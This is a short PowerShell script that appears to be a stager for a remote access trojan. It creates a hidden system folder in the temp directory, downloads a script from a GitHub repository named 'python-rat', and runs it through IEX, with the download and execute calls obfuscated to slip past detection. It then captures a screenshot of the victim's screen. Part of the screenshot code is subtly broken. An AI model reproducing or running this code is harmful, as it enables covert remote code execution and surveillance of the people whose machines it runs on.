$dir = "$env:temp\loader"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir
cd $dir
Set-Location -Path $dir

$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/data.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
$proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
$proc.WaitForExit()

Add-Type -AssemblyName System.Drawing
$screenshot = [System.Drawing.Bitmap]::FromHbitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.ToHbitmap())
$screenshot.Save("Screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
$screenshot.Dispose()
